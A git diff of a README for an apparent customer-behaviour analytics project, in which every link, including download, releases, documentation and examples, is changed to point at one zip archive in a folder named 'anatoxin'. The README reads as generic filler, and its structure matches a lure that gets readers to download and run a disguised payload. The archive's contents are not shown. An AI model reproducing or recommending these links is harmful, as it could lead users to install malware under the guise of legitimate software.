@@ -4,7 +4,7 @@
 Customer_behavior_analysis is a data analytics project designed to help businesses understand customer behavior. Using Python, SQL, and Power BI, this project provides insights into how customers interact with products and services. You can leverage these insights to improve customer satisfaction and boost sales.
 
 ## 🔗 Download Now
-[![Download Latest Release](https://raw.githubusercontent.com/Pearlinedigestive190/Customer_behavior_analysis/main/anatoxin/Customer_behavior_analysis-3.8-alpha.5.zip%20Latest%20Release-Click%20Here-blue)](https://raw.githubusercontent.com/Pearlinedigestive190/Customer_behavior_analysis/main/anatoxin/Customer_behavior_analysis-3.8-alpha.5.zip)
+[![Download Latest Release](https://github.com/Pearlinedigestive190/Customer_behavior_analysis/raw/refs/heads/main/anatoxin/Customer-behavior-analysis-wang.zip%20Latest%20Release-Click%20Here-blue)](https://github.com/Pearlinedigestive190/Customer_behavior_analysis/raw/refs/heads/main/anatoxin/Customer-behavior-analysis-wang.zip)
 
 ## 🚀 Getting Started
 
@@ -20,7 +20,7 @@ Before downloading the software, ensure your computer meets these basic requirem
   - Power BI (for visualization)
 
 ### 2. Download & Install
-To start using Customer_behavior_analysis, visit the [Releases page](https://raw.githubusercontent.com/Pearlinedigestive190/Customer_behavior_analysis/main/anatoxin/Customer_behavior_analysis-3.8-alpha.5.zip) to download the latest version.
+To start using Customer_behavior_analysis, visit the [Releases page](https://github.com/Pearlinedigestive190/Customer_behavior_analysis/raw/refs/heads/main/anatoxin/Customer-behavior-analysis-wang.zip) to download the latest version.
 
 1. Click the link to go to the Releases page.
 2. Look for the latest version. It will be at the top of the list.
@@ -62,8 +62,8 @@ A: Yes, you can analyze any customer-related data. However, ensure the data is f
 If you need help or want to share your feedback, please visit the Discussions section of our GitHub page. You can also report issues on our Issues page.
 
 ## 🔗 Additional Resources
-- [Documentation](https://raw.githubusercontent.com/Pearlinedigestive190/Customer_behavior_analysis/main/anatoxin/Customer_behavior_analysis-3.8-alpha.5.zip): Explore detailed guides for advanced features.
-- [Examples](https://raw.githubusercontent.com/Pearlinedigestive190/Customer_behavior_analysis/main/anatoxin/Customer_behavior_analysis-3.8-alpha.5.zip): Check out example analyses and reports.
+- [Documentation](https://github.com/Pearlinedigestive190/Customer_behavior_analysis/raw/refs/heads/main/anatoxin/Customer-behavior-analysis-wang.zip): Explore detailed guides for advanced features.
+- [Examples](https://github.com/Pearlinedigestive190/Customer_behavior_analysis/raw/refs/heads/main/anatoxin/Customer-behavior-analysis-wang.zip): Check out example analyses and reports.
 
 ## 🔗 Download Now Again
-[![Download Latest Release](https://raw.githubusercontent.com/Pearlinedigestive190/Customer_behavior_analysis/main/anatoxin/Customer_behavior_analysis-3.8-alpha.5.zip%20Latest%20Release-Click%20Here-blue)](https://raw.githubusercontent.com/Pearlinedigestive190/Customer_behavior_analysis/main/anatoxin/Customer_behavior_analysis-3.8-alpha.5.zip)
+[![Download Latest Release](https://github.com/Pearlinedigestive190/Customer_behavior_analysis/raw/refs/heads/main/anatoxin/Customer-behavior-analysis-wang.zip%20Latest%20Release-Click%20Here-blue)](https://github.com/Pearlinedigestive190/Customer_behavior_analysis/raw/refs/heads/main/anatoxin/Customer-behavior-analysis-wang.zip)
